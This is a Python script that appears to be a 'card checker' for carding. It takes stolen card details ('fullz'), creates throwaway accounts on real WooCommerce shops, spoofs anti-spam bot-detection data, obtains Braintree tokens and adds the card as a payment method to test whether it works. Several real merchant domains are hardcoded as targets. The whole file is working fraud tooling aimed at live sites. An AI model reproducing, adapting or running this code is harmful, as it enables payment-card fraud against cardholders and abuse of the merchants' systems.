import base64
import json
import random
import re
import string
import time
from fake_useragent import UserAgent
from FUNC.usersdb_func import *
from FUNC.defs import *
import random
import string
import re
from bs4 import BeautifulSoup
import json
import time
import base64
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import unquote
from urllib.parse import urlparse, parse_qs

def gets(s, start, end):
            try:
                start_index = s.index(start) + len(start)
                end_index = s.index(end, start_index)
                return s[start_index:end_index]
            except ValueError:
                return None



async def create_braintree_auth(fullz , session):
    try:

        cc, mes, ano, cvv = fullz.split("|")


        mail= "criehs4d"+str(random.randint(584, 5658))+"@gamil.com"
        user= "criehs4d"+str(random.randint(584, 5658))

        # url = "thebraincandypodcast.com"
        # url = "www.weddingtropics.com"
        # url = "www.naturaw.co.uk"
        # url = "christianapostles.com"
        # url = "christianapostles.com"
        # url = "ce4less.com"
        url = "medicalmonks.com"



        # url = "digicel.net"
        # print(url)
 

        response = await session.get(f'https://{url}/my-account/')
        response = await session.get(f'https://{url}/my-account/')


        rnonce = gets(response.text, '"woocommerce-register-nonce" value="', '"')

        c = "apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiZW1haWwiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6Indvb2NvbW1lcmNlLXJlZ2lzdGVyLW5vbmNlIF93cF9odHRwX3JlZmVyZXIgY3Rfbm9fY29va2llX2hpZGRlbl9maWVsZCIsImludmlzaWJsZV9maWVsZHNfY291bnQiOjN9fQ%3D%3D&ct_no_cookie_hidden_field=_ct_no_cookie_data_eyJhcGJjdF90aW1lc3RhbXAiOiIxNjk3ODM1MjQ3IiwiY3RfbW91c2VfbW92ZWQiOnRydWUsImFwYmN0X3VybHMiOiJ7XCJkaWdpY2VsLm5ldC9teS1hY2NvdW50L1wiOlsxNjk3ODM1MjQ3XX0iLCJjdF9oYXNfc2Nyb2xsZWQiOnRydWUsImN0X2NoZWNrZWRfZW1haWxzIjoiMCIsImN0X3BzX3RpbWVzdGFtcCI6IjE2OTc4MzUyNDciLCJjdF9jb29raWVzX3R5cGUiOiJub25lIiwiYXBiY3RfaGVhZGxlc3MiOiJmYWxzZSIsImN0X2hhc19rZXlfdXAiOiJ0cnVlIiwiYXBiY3RfcGFnZV9oaXRzIjoxLCJhcGJjdF92aXNpYmxlX2ZpZWxkcyI6IiU3QiUyMnZpc2libGVfZmllbGRzJTIyJTNBJTIyZW1haWwlMjIlMkMlMjJ2aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTElMkMlMjJpbnZpc2libGVfZmllbGRzJTIyJTNBJTIyd29vY29tbWVyY2UtcmVnaXN0ZXItbm9uY2UlMjBfd3BfaHR0cF9yZWZlcmVyJTIwYXBiY3RfdmlzaWJsZV9maWVsZHMlMjBjdF9ub19jb29raWVfaGlkZGVuX2ZpZWxkJTIyJTJDJTIyaW52aXNpYmxlX2ZpZWxkc19jb3VudCUyMiUzQTQlN0QiLCJhcGJjdF9zaXRlX2xhbmRpbmdfdHMiOiIxNjk3ODM1MjQ3IiwiYXBiY3RfY29va2llc190ZXN0IjoiJTdCJTIyY29va2llc19uYW1lcyUyMiUzQSU1QiUyMmFwYmN0X3RpbWVzdGFtcCUyMiUyQyUyMmFwYmN0X3NpdGVfbGFuZGluZ190cyUyMiU1RCUyQyUyMmNoZWNrX3ZhbHVlJTIyJTNBJTIyZTNiODE3N2ExY2E3NGNmYzYwOTAzZGUwYTk3MmJjZTklMjIlN0QiLCJjdF9oYXNfaW5wdXRfZm9jdXNlZCI6InRydWUiLCJjdF9ma3BfdGltZXN0YW1wIjoiMTY5NzgzNTI1OCIsImN0X3BvaW50ZXJfZGF0YSI6IiU1QiU1QjQwOCUyQzE2MCUyQzEyMzAzJTVEJTVEIiwiY3Rfc2NyZWVuX2luZm8iOiIlN0IlMjJmdWxsV2lkdGglMjIlM0EzNjAlMkMlMjJmdWxsSGVpZ2h0JTIyJTNBMjY0NCUyQyUyMnZpc2libGVXaWR0aCUyMiUzQTM2MCUyQyUyMnZpc2libGVIZWlnaHQlMjIlM0E2MjElN0QiLCJjdF9jaGVja2pzIjoiMTg5OTUxOTIwNCIsImN0X3RpbWV6b25lIjoiLTUiLCJhcGJjdF9waXhlbF91cmwiOiJodHRwcyUzQSUyRiUyRm1vZGVyYXRlMS12NC5jbGVhbnRhbGsub3JnJTJGcGl4ZWwlMkY1NjBiMzYyOTliYTNhYzI1OTNkZjZhYjA1OGZkOGMyYi5naWYiLCJhcGJjdF9zZXNzaW9uX2lkIjoiZ2JjcWl4IiwiYXBiY3Rfc2Vzc2lvbl9jdXJyZW50X3BhZ2UiOiJodHRwczovL2RpZ2ljZWwubmV0L215LWFjY291bnQvIiwidHlwbyI6W119"


        print(rnonce)

     
        # params = {
        #     'action': 'register',
        # }

        data = {
            'username': f'{user}',
            'email': f'{mail}',
            'password': 'ZeqWwhggxkgsP4p',
            'email_2': '',
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': f'https://{url}/',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_session_entry': f'https://{url}/my-account/?action=register',
            'wc_order_attribution_session_start_time': '2024-06-13 07:13:30',
            'wc_order_attribution_session_pages': '1',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
            'metorik_source_type': 'typein',
            'metorik_source_url': f'https://{url}/',
            'metorik_source_mtke': '',
            'metorik_source_utm_campaign': '(none)',
            'metorik_source_utm_source': '(direct)',
            'metorik_source_utm_medium': '(none)',
            'metorik_source_utm_content': '(none)',
            'metorik_source_utm_id': '(none)',
            'metorik_source_utm_term': '(none)',
            'metorik_source_session_entry': f'https://{url}/my-account/?action=register',
            'metorik_source_session_start_time': '2024-06-13 07:13:30',
            'metorik_source_session_pages': '2',
            'metorik_source_session_count': '1',
            'woocommerce-register-nonce': rnonce,
            '_wp_http_referer': '/my-account/?action=register',
            'register': 'Register',
        }

        # response = await session.post(f'https://{url}/my-account/', params=params, data=data)
        response = await session.post(f'https://{url}/my-account/', data=data)

        head3 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "referer": f"https://{url}/my-account/edit-address/",
        }

        r3 = await session.get(
            f"https://{url}/my-account/edit-address/billing/",
            headers=head3,
        )
        anonce = gets(r3.text, '"woocommerce-edit-address-nonce" value="', '"')

        # print(anonce)


        post4 = f"billing_first_name=Sachio&billing_last_name=YT&billing_company=YT&billing_country=US&billing_address_1=118+W+132nd+St&billing_address_2=&billing_city=New+York&billing_state=NY&billing_postcode=10027&billing_phone=19006318646&billing_email={mail}&save_address=Save+address&woocommerce-edit-address-nonce={anonce}&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address&{c}"

        head4 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/edit-address/billing/",
        }

        r4 = await session.post(
            f"https://{url}/my-account/edit-address/billing/",
            headers=head4,
            data=post4,
        )

        r5 = await session.get(
            f"https://{url}/my-account/payment-methods/",
            headers=head4,
        )



        cnonce = gets(r5.text, '"client_token_nonce":"', '"')

        # print(cnonce)

        head6 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/payment-methods/",
        }


        r6 = await session.get(
            f"https://{url}/my-account/add-payment-method/",
        )
        # print(r5.text)



        # print(r6.text)
        wnonce = gets(r6.text, '"woocommerce-add-payment-method-nonce" value="', '"')


        # print(wnonce)





        post7 = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"

        r7 = await session.post(
            f"https://{url}/wp-admin/admin-ajax.php",
            headers=head6,
            data=post7,
        )
        ey = gets(r7.text, '"data":"', '"')
        be_1 = base64.b64decode(ey).decode("utf-8")
        be = gets(be_1, '"authorizationFingerprint":"', '"')

        # print(be)

        head8 = {
            "Host": "payments.braintree-api.com",
            "content-type": "application/json",
            "authorization": f"Bearer {be}",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "braintree-version": "2018-05-10",
            "accept": "*/*",
            "origin": "https://assets.braintreegateway.com",
            "referer": "https://assets.braintreegateway.com/",
        }

        post8 = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "dropin2",
                "sessionId": "2eb8e620-9b4b-42d5-be2f-c3249ec470aa",
            },
            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": f"{cc}",
                        "expirationMonth": f"{mes}",
                        "expirationYear": f"{ano}",
                        "cvv": f"{cvv}",
                        "cardholderName": "Sachio YT",
                        "billingAddress": {"postalCode": "10027"},
                    },
                    "options": {"validate": False},
                }
            },
            "operationName": "TokenizeCreditCard",
        }

        r8 = await session.post(
            "https://payments.braintree-api.com/graphql",
            headers=head8,
            json=post8,
        )
        tok = gets(r8.text, '"token":"', '"')
        brand_ = gets(r8.text, '"brandCode":"', '"').lower()


        # print(tok)
        # print(brand_)

        head9 = {
            "Host": f"{url}",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "content-type": "application/x-www-form-urlencoded",
            "origin": f"https://{url}",
            "referer": f"https://{url}/my-account/add-payment-method/",
        }

        post9 = f"payment_method=braintree_credit_card&wc-braintree-credit-card-card-type={brand_}&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce={tok}&wc_braintree_device_data=&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce={wnonce}&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1&{c}"

        response = await session.post(
            f"https://{url}/my-account/add-payment-method/",
            headers=head9,
            data=post9,
        )

        # response = await session.post(
        #     f"https://{url}/my-account/add-payment-method/",
        #     headers=head9,
        # )



        response=response.text

        # print(response)



        # pattern = re.compile(r'<div class="message-container container alert-color medium-text-center">.*?</div>', re.DOTALL)
        # match = pattern.search(response.text)

        # # Check if a match was found and print it
        # if match:
        #     result = match.group(0)
        #     print(result)
        # else:
        #     print("No match found")

        return response



    except Exception as e:
        return str(e)
